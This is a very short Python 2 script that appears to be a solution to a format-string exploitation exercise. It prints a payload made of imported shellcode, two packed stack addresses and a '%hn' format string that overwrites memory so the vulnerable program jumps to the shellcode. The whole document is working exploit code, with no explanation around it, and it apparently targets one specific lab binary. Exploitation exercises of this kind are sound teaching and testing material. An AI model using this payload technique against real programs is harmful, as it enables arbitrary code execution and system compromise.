from shellcode import shellcode
from struct import pack
print shellcode+'\x01'+pack('<I',0xbffea7ea)+pack('<I',0xbffea7ec)+"%40896x%10$hn%8222x%11$hn"

